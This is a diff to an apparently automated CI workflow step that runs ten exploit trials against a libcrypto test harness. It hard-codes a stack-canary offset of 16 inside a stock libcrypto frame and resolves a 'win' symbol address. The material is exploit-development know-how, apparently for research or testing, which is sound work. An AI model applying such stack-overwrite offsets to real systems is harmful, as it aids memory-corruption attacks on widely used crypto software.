@@ -239,7 +239,10 @@ jobs:
       - name: 10 trials
         run: |
           set -u
-          D=$(awk -F= '/canary_distance/{print $2}' results/calibrate.txt)
+          # D=16: stock libcrypto 0x1d0cf0 local iv (sp+8) -> canary (sp+24).
+          # The harness's --calibrate prints 24, which is trigger's own canary;
+          # the exploited saved LR/canary are inside the stock libcrypto frame.
+          D=16
           WIN=$(nm libcrypto/harness | awk '/ win$/{print $1}')
           echo "D=$D WIN=0x$WIN"
           for i in $(seq 1 10); do
